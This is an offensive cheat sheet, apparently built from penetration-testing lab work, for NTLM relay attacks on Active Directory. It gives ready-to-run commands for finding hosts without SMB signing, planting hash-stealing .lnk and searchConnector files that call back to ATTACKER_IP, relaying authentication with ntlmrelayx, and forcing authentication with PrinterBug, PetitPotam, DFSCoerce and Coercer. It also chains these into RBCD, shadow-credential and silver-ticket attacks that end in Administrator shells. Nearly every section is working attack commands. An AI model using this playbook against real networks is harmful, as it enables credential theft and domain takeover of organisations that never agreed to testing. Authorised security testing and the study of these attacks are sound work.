# NTLM Relay Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Enumerate Relay Targets (SMB Signing Disabled) [added: 2026-04]
- **Tags:** #SMBSigning #RelayTarget #RunFinger #CrackMapExec #NTLMRelay #T1557.001
- **Trigger:** SMB signing disabled on non-DC hosts detected during network enumeration
- **Prereq:** Network access to target subnet; valid domain credentials (for CME) or passive scanning
- **Yields:** List of hosts with SMB signing disabled (viable NTLM relay targets)
- **Opsec:** Low
- **Context:** Identify hosts with SMB signing off — required for SMB relay attacks.
- **Payload/Method:**
  ```bash
  # RunFinger (Responder toolkit)
  python3 RunFinger.py -i 172.16.117.0/24

  # CrackMapExec
  crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
  ```

### Enumerate WebDAV Servers [added: 2026-04]
- **Tags:** #WebDAV #NTLMRelay #HTTPRelay #LDAPRelay #WebDAVEnum #T1557
- **Trigger:** Need HTTP-based NTLM coercion targets for LDAP relay (no signing on LDAP)
- **Prereq:** Valid domain credentials; network access to target subnet
- **Yields:** List of WebDAV-enabled servers (can be coerced into HTTP NTLM auth, relayable to LDAP)
- **Opsec:** Low
- **Context:** WebDAV servers can be coerced into HTTP-based NTLM auth, which can be relayed to LDAP (no signing by default).
- **Payload/Method:** `crackmapexec smb 172.16.117.0/24 -u plaintext$ -p 'PASSWORD' -M webdav`

### Hash Farming via NTLM Theft Files [added: 2026-04]
- **Tags:** #NTLMTheft #HashFarming #LNK #searchConnector #slinky #CredentialCapture #T1187
- **Trigger:** Writable network shares discovered; want passive NTLM hash collection
- **Prereq:** Write access to network shares; attacker SMB/HTTP listener running
- **Yields:** NTLMv2 hashes of users who browse the share containing crafted files
- **Opsec:** Med
- **Context:** Drop specially crafted files (.lnk, .searchConnector-ms, .url, etc.) into writable shares. When a user browses the share, their NTLM hash is sent to attacker.
- **Payload/Method:**
  ```bash
  # Generate all NTLM theft file types
  python3 ntlm_theft.py -g all -s <ATTACKER_IP> -f '@myfile'

  # CME slinky module — drop .lnk in writable share
  crackmapexec smb <TARGET> -u anonymous -p '' -M slinky -o SERVER=<ATTACKER_IP> NAME=important

  # CME drop-sc module — drop .searchConnector-ms file
  crackmapexec smb <TARGET> -u anonymous -p '' -M drop-sc -o URL=https://<ATTACKER_IP>/testing SHARE=smb FILENAME=@secret
  ```

### NTLMRelayx — Core Relay Modes [added: 2026-04]
- **Tags:** #ntlmrelayx #NTLMRelay #SMBRelay #LDAPRelay #MSSQLRelay #Impacket #T1557.001
- **Trigger:** NTLM hashes being captured via Responder/coercion; relay targets identified
- **Prereq:** ntlmrelayx running; relay targets with signing disabled; NTLM auth source (Responder/coercion)
- **Yields:** Authenticated sessions on relay targets (SMB shell, LDAP access, MSSQL queries)
- **Opsec:** Med
- **Context:** Relay captured NTLM auth to targets with signing disabled. Multiple protocol targets available.
- **Payload/Method:**
  ```bash
  # Default relay to SMB target list
  ntlmrelayx.py -tf relayTargets.txt -smb2support

  # Execute command on relay
  ntlmrelayx.py -t 172.16.117.50 -smb2support -c "whoami"

  # Protocol-specific targets
  ntlmrelayx.py -t smb://172.16.117.50
  ntlmrelayx.py -t mssql://172.16.117.50
  ntlmrelayx.py -t ldap://172.16.117.50
  ntlmrelayx.py -t all://172.16.117.50

  # Named target (relay specific user's auth)
  ntlmrelayx.py -t smb://DOMAIN\\USER@172.16.117.50
  ```

### NTLMRelayx — SOCKS Proxy for Relayed Sessions [added: 2026-04]
- **Tags:** #ntlmrelayx #SOCKSProxy #RelayedSession #Proxychains #PersistentRelay #T1557.001
- **Trigger:** Want to keep relayed sessions alive for extended use with multiple tools
- **Prereq:** ntlmrelayx running with relay targets; NTLM auth source
- **Yields:** SOCKS proxy with relayed authenticated sessions usable via proxychains
- **Opsec:** Med
- **Context:** Keep relayed sessions alive as SOCKS proxies. Use with proxychains to run any tool through the relayed auth.
- **Payload/Method:** `ntlmrelayx.py -tf relayTargets.txt -smb2support -socks`

### NTLMRelayx — Interactive SMB Shell [added: 2026-04]
- **Tags:** #ntlmrelayx #SMBShell #InteractiveRelay #SMBClient #T1557.001
- **Trigger:** Need interactive file system access via relayed SMB session
- **Prereq:** ntlmrelayx running; SMB relay target with signing disabled
- **Yields:** Interactive SMB client shell through relayed NTLM authentication
- **Opsec:** Med
- **Context:** Get an interactive SMB client shell through relayed auth.
- **Payload/Method:** `ntlmrelayx.py -tf relayTargets.txt -smb2support -i`

### NTLMRelayx — MSSQL Query Execution [added: 2026-04]
- **Tags:** #ntlmrelayx #MSSQLRelay #SQLQuery #HashRelay #DatabaseAccess #T1557
- **Trigger:** MSSQL target identified; NTLM auth being captured
- **Prereq:** ntlmrelayx running; MSSQL target accessible; relayed user has MSSQL access
- **Yields:** SQL query results as the relayed user on MSSQL target
- **Opsec:** Med
- **Context:** Relay NTLM auth to MSSQL and execute queries as the relayed user.
- **Payload/Method:** `ntlmrelayx.py -t mssql://DOMAIN\\USER@<IP> -smb2support -q "SELECT name FROM sys.databases;"`

### NTLMRelayx — LDAP Domain Enumeration [added: 2026-04]
- **Tags:** #ntlmrelayx #LDAPRelay #DomainDump #ADEnum #LDAPEnum #T1557
- **Trigger:** DC LDAP accessible; relaying auth to dump domain information
- **Prereq:** ntlmrelayx running; DC LDAP accessible; relayed user has domain read access
- **Yields:** Full domain dump (users, groups, computers) via relayed LDAP authentication
- **Opsec:** Med
- **Context:** Relay to LDAP on DC to dump domain information (users, groups, etc.).
- **Payload/Method:** `ntlmrelayx.py -t ldap://<DC_IP> -smb2support --no-da --no-acl --lootdir ldap_dump`

### NTLMRelayx — LDAP Computer Account Creation [added: 2026-04]
- **Tags:** #ntlmrelayx #LDAPRelay #MachineAccount #RBCD #ComputerCreation #T1557
- **Trigger:** Need a machine account for RBCD abuse; can relay auth to LDAP on DC
- **Prereq:** ntlmrelayx relaying to LDAP on DC; relayed user has machine account creation rights
- **Yields:** New machine account for RBCD abuse or other delegation attacks
- **Opsec:** Med
- **Context:** Relay to LDAP to create a machine account (useful for RBCD abuse).
- **Payload/Method:** `ntlmrelayx.py -t ldap://<DC_IP> -smb2support --no-da --no-acl --add-computer 'newmachine$'`

### NTLMRelayx — ACL Escalation via LDAP Relay [added: 2026-04]
- **Tags:** #ntlmrelayx #ACLEscalation #LDAPRelay #DCSync #WriteDACL #T1557
- **Trigger:** Relaying high-privilege auth (e.g., machine account) to LDAP for ACL modification
- **Prereq:** ntlmrelayx relaying to LDAP on DC; relayed account with WriteDACL on domain object
- **Yields:** DCSync or other dangerous rights granted to controlled account
- **Opsec:** High
- **Context:** Relay to LDAP and modify ACLs to grant a controlled account DCSync or other dangerous rights.
- **Payload/Method:** `ntlmrelayx.py -t ldap://<DC_IP> -smb2support --escalate-user 'controlleduser$' --no-dump -debug`

### Coerce Authentication — PrinterBug (MS-RPRN) [added: 2026-04]
- **Tags:** #PrinterBug #MSRPRN #SpoolService #NTLMCoercion #AuthCoercion #T1187
- **Trigger:** Print Spooler service running on target (default on many Windows servers)
- **Prereq:** Valid domain credentials; Print Spooler service running on target
- **Yields:** Forced NTLM authentication from target machine account to attacker listener
- **Opsec:** Med
- **Context:** Force a target machine to authenticate back to attacker via the Print Spooler service. Requires valid domain creds.
- **Payload/Method:** `python3 printerbug.py domain/user:'password'@<TARGET> <ATTACKER_IP>`

### Coerce Authentication — PetitPotam (MS-EFSR) [added: 2026-04]
- **Tags:** #PetitPotam #MSEFSR #EFS #NTLMCoercion #UnauthCoercion #T1187
- **Trigger:** DC or server with EFS RPC endpoint exposed; unpatched systems
- **Prereq:** Network access to target; optionally valid domain credentials (unauthenticated on unpatched DCs)
- **Yields:** Forced NTLM authentication from target machine account to attacker listener
- **Opsec:** Med
- **Context:** Force NTLM auth via EFS RPC. Works unauthenticated on unpatched DCs.
- **Payload/Method:** `python3 PetitPotam.py <ATTACKER_IP> <TARGET> -u 'user' -p 'password' -d domain.local`

### Coerce Authentication — DFSCoerce (MS-DFSNM) [added: 2026-04]
- **Tags:** #DFSCoerce #MSDFSNM #DFS #NTLMCoercion #AuthCoercion #T1187
- **Trigger:** DFS namespace service running on target server
- **Prereq:** Valid domain credentials; DFS RPC endpoint accessible on target
- **Yields:** Forced NTLM authentication from target machine account to attacker listener
- **Opsec:** Med
- **Context:** Force NTLM auth via DFS RPC.
- **Payload/Method:** `python3 dfscoerce.py -u 'user' -p 'password' <ATTACKER_IP> <TARGET>`

### Coerce Authentication — Coercer (Multi-Protocol Scanner) [added: 2026-04]
- **Tags:** #Coercer #MultiProtocol #NTLMCoercion #AutoScan #AuthCoercion #T1187
- **Trigger:** Need to scan target for all available coercion methods automatically
- **Prereq:** Valid domain credentials; network access to target
- **Yields:** Discovery and exploitation of all available NTLM coercion methods on target
- **Opsec:** Med
- **Context:** Coercer scans for and exploits multiple coercion methods automatically.
- **Payload/Method:**
  ```bash
  # Scan for available coercion methods
  Coercer scan -t <TARGET> -u 'user' -p 'password' -d domain.local -v

  # Execute coercion
  Coercer coerce -t <TARGET> -l <ATTACKER_IP> -u 'user' -p 'password' -d domain.local -v --always-continue
  ```

### RBCD Abuse via NTLM Relay [added: 2026-04]
- **Tags:** #RBCD #NTLMRelay #DelegateAccess #S4U2Proxy #ConstrainedDelegation #T1557
- **Trigger:** Machine account auth captured; can relay to LDAPS on DC
- **Prereq:** Machine account NTLM auth captured; LDAPS on DC accessible; controlled machine account
- **Yields:** Service ticket impersonating Administrator on target via RBCD + S4U2Proxy chain
- **Opsec:** Med
- **Context:** Relay machine account auth to LDAPS to set msDS-AllowedToActOnBehalfOfOtherIdentity on the target, enabling S4U2Proxy impersonation.
- **Payload/Method:**
  ```bash
  # Step 1: Relay to LDAPS with delegate-access
  ntlmrelayx.py -t ldaps://DOMAIN\\'MACHINE$'@<DC_IP> --delegate-access --escalate-user 'controlled$' --no-smb-server --no-dump

  # Step 2: Request impersonated service ticket
  getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP> "DOMAIN"/"controlled$":"password"

  # Step 3: Use ticket
  KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <TARGET_FQDN>
  ```

### Shadow Credentials via NTLM Relay [added: 2026-04]
- **Tags:** #ShadowCredentials #NTLMRelay #KeyCredentialLink #PKINIT #CertificateAuth #T1557
- **Trigger:** Can relay auth to LDAP on DC; want to persist access via certificate-based auth
- **Prereq:** ntlmrelayx with shadow-credentials support; LDAP relay to DC; target supports PKINIT
- **Yields:** Certificate-based authentication to target via injected msDS-KeyCredentialLink
- **Opsec:** Med
- **Context:** Relay auth to LDAP and write msDS-KeyCredentialLink on a target user/computer. Then use the resulting certificate for PKINIT auth.
- **Payload/Method:**
  ```bash
  # Step 1: Relay and inject shadow credential
  ntlmrelayx.py -t ldap://DOMAIN.LOCAL\\TARGET@<DC_IP> --shadow-credentials --shadow-target <VICTIM_USER> --no-da --no-dump --no-acl

  # Step 2: Use certificate to get TGT
  python3 gettgtpkinit.py -cert-pfx <CERT>.pfx -pfx-pass <PASSWORD> DOMAIN.LOCAL/<VICTIM_USER> victim.ccache

  # Step 3: Authenticate with ticket
  KRB5CCNAME=victim.ccache evil-winrm -i <TARGET_FQDN> -r DOMAIN.LOCAL
  ```

### Silver Ticket from Relayed Machine Certificate (Post-ESC8) [added: 2026-04]
- **Tags:** #SilverTicket #ESC8 #MachineHash #TicketForging #ADCS #CertificateRelay #T1558.002
- **Trigger:** Machine account NT hash obtained via ESC8 certificate relay attack
- **Prereq:** Machine account NT hash (from ESC8 relay); domain SID
- **Yields:** Forged silver ticket for local admin access on the machine
- **Opsec:** Med
- **Context:** After obtaining a machine account's NT hash via ESC8 relay, forge a silver ticket for local admin access.
- **Payload/Method:**
  ```bash
  # Step 1: Get Domain SID
  lookupsid.py 'DOMAIN/MACHINE$'@<DC_IP> -hashes :<NT_HASH>

  # Step 2: Forge silver ticket
  ticketer.py -nthash <NT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/<TARGET_FQDN> Administrator

  # Step 3: Use ticket
  KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <TARGET_FQDN>
  ```
